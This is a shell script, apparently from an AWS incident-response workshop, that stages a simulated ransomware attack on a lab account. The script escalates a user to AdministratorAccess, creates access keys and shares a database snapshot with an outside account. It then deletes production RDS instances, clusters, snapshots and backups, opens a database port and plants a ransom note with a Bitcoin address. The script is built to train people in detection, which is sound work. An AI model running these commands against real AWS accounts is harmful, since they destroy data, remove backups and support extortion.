# MIT No Attribution
# 
# Copyright 2024 AWS
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this
# software and associated documentation files (the "Software"), to deal in the Software
# without restriction, including without limitation the rights to use, copy, modify,
# merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
#!/bin/bash
#
DBIDDEV=$(aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRDEV`].DBInstanceIdentifier' --output text)
aws rds modify-db-instance --db-instance-identifier $DBIDDEV --no-manage-master-user-password --master-user-password aws123aws123 > /dev/null 
#
export MYSQL_TMP="aws123aws123"
export MYSQL_PWD="XXXXXXXX"
# Run Command
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 1 of 9..."
#
#
#
NWOLF_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`AccessKeyformyaccesskey2`].OutputValue | [0] | [0]' | tr -d '"')
NWOLF_SECRET_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`SecretKeyformyaccesskey2`].OutputValue | [0] | [0]' | tr -d '"')
#
aws iam list-access-keys --user tdir-workshop-nwolf > keycheck-step01-nwolf.json
export GETKEY01NWOLF=$(jq -r '.AccessKeyMetadata' keycheck-step01-nwolf.json)
while [ "${GETKEY01NWOLF}" = "[]" ]
do
  aws iam list-access-keys --user tdir-workshop-nwolf > keycheck-step01-nwolf.json
  export GETKEY01NWOLF=$(jq -r '.AccessKeyMetadata' keycheck-step01-nwolf.json)
  echo "..."
  sleep 1
done
echo "---"
#
DRAMIREZ_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`AccessKeyformyaccesskey`].OutputValue | [0] | [0]' | tr -d '"')
DRAMIREZ_SECRET_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`SecretKeyformyaccesskey`].OutputValue | [0] | [0]' | tr -d '"')
#
aws iam list-access-keys --user tdir-workshop-dramirez-dev > keycheck-step01-drz.json
export GETKEY01DRZ=$(jq -r '.AccessKeyMetadata' keycheck-step01-drz.json)
while [ "${GETKEY01DRZ}" = "[]" ]
do
  aws iam list-access-keys --user tdir-workshop-dramirez-dev > keycheck-step01-drz.json
  export GETKEY01DRZ=$(jq -r '.AccessKeyMetadata' keycheck-step01-drz.json)
  echo "..."
  sleep 1
done
echo "---"

#
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=${NWOLF_AKID}
export AWS_SECRET_ACCESS_KEY=${NWOLF_SECRET_AKID}
export AWS_DEFAULT_REGION=us-east-1
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
rm keycheck-step01-nwolf.json
#
#
#
aws ec2 describe-instances > /dev/null 2>&1
aws ec2 describe-instances > /dev/null 2>&1
aws ec2 describe-instances > /dev/null 2>&1
aws iam list-users  > /dev/null 2>&1
aws iam list-users > /dev/null 2>&1
aws iam list-users > /dev/null 2>&1
aws iam list-groups > /dev/null 2>&1
aws iam list-groups > /dev/null 2>&1
aws iam list-groups > /dev/null 2>&1
aws iam attach-user-policy --user-name tdir-workshop-mmajor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1
aws iam attach-user-policy --user-name tdir-workshop-mmajor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1
aws iam attach-user-policy --user-name tdir-workshop-mmajor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1
aws iam create-access-key --user-name tdir-workshop-nwolf > /dev/null 2>&1
aws iam create-access-key --user-name tdir-workshop-nwolf > /dev/null 2>&1
aws iam create-access-key --user-name tdir-workshop-nwolf > /dev/null 2>&1
#

unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=${DRAMIREZ_AKID}
export AWS_SECRET_ACCESS_KEY=${DRAMIREZ_SECRET_AKID}
export AWS_DEFAULT_REGION=us-east-1
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
rm keycheck-step01-drz.json
#
aws rds describe-db-instances > /dev/null
DBIDDEV=$(aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRDEV`].DBInstanceIdentifier' --output text)
DBIDPROD=$(aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRPROD`].DBInstanceIdentifier' --output text)
#
aws rds describe-db-snapshots > /dev/null
aws rds describe-db-snapshots > /dev/null
aws rds describe-db-snapshots > /dev/null
#
#
echo "Ransomware Security Event Simulation: Phase 1 of 9 - complete.  The remaining phases can take up to 20 minutes to finish."
echo "While the remaining phases are completing, feel free to go through the 'Using Amazon Athena', 'Reviewing Logs', and"
echo "the 'Detection > Investigating Ransomware - Part 1' sections."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 2 of 9..."
echo "---"
#
sleep 10
#
echo "Ransomware Security Event Simulation: Phase 2 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 3 of 9..."
echo "---"

aws rds create-db-cluster-snapshot --db-cluster-snapshot-identifier tdir-workshop-rds-backup --db-cluster-identifier tdir-cluster-1 > /dev/null
aws rds describe-db-cluster-snapshots --db-cluster-snapshot-identifier tdir-workshop-rds-backup > rds-snapshotcheck-01.json
export GETSNAP=$(jq -r '.DBClusterSnapshots[].Status' rds-snapshotcheck-01.json)

while [ "${GETSNAP}" = "creating" ]
do
  aws rds describe-db-cluster-snapshots --db-cluster-snapshot-identifier tdir-workshop-rds-backup > rds-snapshotcheck-01.json
  export GETSNAP=$(jq -r '.DBClusterSnapshots[].Status' rds-snapshotcheck-01.json)
  echo "...Continuing phase - please wait..."
  sleep 20
done
rm rds-snapshotcheck-01.json
echo "Ransomware Security Event Simulation: Phase 3 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 4 of 9..."
echo "---"
sleep 10
aws rds modify-db-cluster-snapshot-attribute --db-cluster-snapshot-identifier tdir-workshop-rds-backup --attribute-name restore --values-to-add 012345678901 > /dev/null
sleep 10
echo "Ransomware Security Event Simulation: Phase 4 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 5 of 9..."
echo "---"
aws rds delete-db-instance --db-instance-identifier $DBIDPROD --skip-final-snapshot --delete-automated-backup > /dev/null
aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRPROD`].DBInstanceStatus' > rds-delcheck-01.json

export GETDEL=$(jq -r '.[]' rds-delcheck-01.json)

while [ "${GETDEL}" = "deleting" ]
do
  aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRPROD`].DBInstanceStatus' > rds-delcheck-01.json
  export GETDEL=$(jq -r '.[]' rds-delcheck-01.json)
  echo "...Continuing phase - please wait..."
  sleep 20
done
rm rds-delcheck-01.json
aws rds delete-db-cluster --db-cluster-identifier tdir-cluster-1 --skip-final-snapshot --delete-automated-backups 2> /dev/null
aws rds delete-db-cluster --db-cluster-identifier tdir-cluster-1 --skip-final-snapshot --delete-automated-backups 2> /dev/null
aws rds delete-db-cluster --db-cluster-identifier tdir-cluster-1 --skip-final-snapshot --delete-automated-backups 2> /dev/null
aws rds modify-db-cluster --db-cluster-identifier tdir-cluster-1 --no-deletion-protection > /dev/null
aws rds delete-db-cluster --db-cluster-identifier tdir-cluster-1 --skip-final-snapshot --delete-automated-backups > /dev/null
sleep 10
aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier tdir-workshop-rds-backup > /dev/null
aws rds describe-db-cluster-snapshots --db-cluster-identifier tdir-cluster-1 --query "DBClusterSnapshots[].DBClusterSnapshotIdentifier" > cluster-snapshots.json
export GETCLDEL=$(jq -r '.[]' cluster-snapshots.json)
aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier $GETCLDEL > /dev/null 2>&1
rm cluster-snapshots.json
sleep 10
echo "Ransomware Security Event Simulation: Phase 5 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 6 of 9..."
echo "---"
aws rds describe-db-snapshots --region us-east-1 --query "DBSnapshots[?DBInstanceIdentifier=='$DBIDDEV'].DBSnapshotIdentifier" | jq -r '.[]' > rds-snapshots
while read line; do aws rds delete-db-snapshot --db-snapshot-identifier $line 2> /dev/null; done < rds-snapshots
rm rds-snapshots
sleep 10
aws rds modify-db-instance --db-instance-identifier $DBIDDEV --backup-retention-period 0 --apply-immediately > /dev/null
aws rds describe-db-instances --db-instance-identifier $DBIDDEV > rds-backupcheck.json
export GETBACKUP=$(jq -r '.DBInstances[].BackupRetentionPeriod' rds-backupcheck.json)
while [ "${GETBACKUP}" -gt 0 ]
do
  aws rds describe-db-instances --db-instance-identifier $DBIDDEV > rds-backupcheck.json
  export GETBACKUP=$(jq -r '.DBInstances[].BackupRetentionPeriod' rds-backupcheck.json)
  echo "...Continuing phase - please wait..."
  sleep 20
done
rm rds-backupcheck.json
echo "Ransomware Security Event Simulation: Phase 6 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 7 of 9..."
echo "---"
#
DBENDPOINTDEV=$(aws rds describe-db-instances --query 'DBInstances[?DBName==`TDIRDEV`].Endpoint.Address' --output text)
IDEIP=$(aws ec2 describe-instances --filters "Name=tag-value,Values=ide-ec2" --query 'Reservations[*].Instances[*].PublicIpAddress' --output text)
IDEIP+=/32
DBEC2SG=$(aws ec2 describe-security-groups --filter Name=group-name,Values='TDIR Workshop DBEC2 Security Group' --query 'SecurityGroups[*].[GroupId]' --output text)
aws ec2 authorize-security-group-ingress --group-id $DBEC2SG --protocol tcp --port 3306 --cidr $IDEIP > /dev/null
#
#
echo "Ransomware Security Event Simulation: Phase 7 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 8 of 9..."
echo "---"
# mysql -h$DBENDPOINTPROD -uadmin -e"SELECT@@version;"
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
mysql -h$DBENDPOINTDEV -uadmin 2> /dev/null
sleep 1

echo "Ransomware Security Event Simulation: Phase 8 of 9 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 9 of 9..."
echo "---"


export MYSQL_PWD=$MYSQL_TMP
# mysql -h$DBENDPOINTPROD -uadmin -e"use TDIRPROD; DROP TABLE *;"
mysql -h$DBENDPOINTDEV -uadmin -e"use TDIRDEV; CREATE TABLE ransom (
     id INT NOT NULL AUTO_INCREMENT,
     note VARCHAR(255) NOT NULL,
     PRIMARY KEY (id)
 );
INSERT INTO ransom 
(id, note)
VALUES 
('1','UR DATABASES HAVE BEEN PWNED'),
('2','THE DATA HAS BEEN TAKEN BY US AND DELETED'),
('3','SEND 100 BILLION DOLLARS IN BITCOIN WITHIN 48 HOURS AND WE WILL RETURN THE DATA'),
('4','BTC WALLET ADDRESS 1Lbcfr7sGIMMEBITCOINSPLZTkV8LK4ZnX71');
"
echo "Ransomware Security Event Simulation: Phase 9 of 9 - complete."
echo "---"
echo "End of Simulation"
echo ""
echo "*******************************************************************************"
echo "*    SCENARIO: A ransom note has appeared in one of the database tables of    *"
echo "*    your AWS account!                                                        *"
echo "*                                                                             *"
echo "*    Use your AWS skills to determine the scope of any unauthorized use       *"
echo "*    and discover what other actions have been taken.                         *"
echo "*                                                                             *"
echo "*    There are questions at the beginning of each 'Detection' section of      *"
echo "*    this workshop that can be used to prompt your investigation if you get   *"
echo "*    stuck.  The end of each 'Detection' section will have hints and a        *"
echo "*    walkthrough to help provide answers to the questions.                    *" 
echo "*                                                                             *" 
echo "*    Good luck!                                                               *" 
echo "*                                                                             *" 
echo "*******************************************************************************"



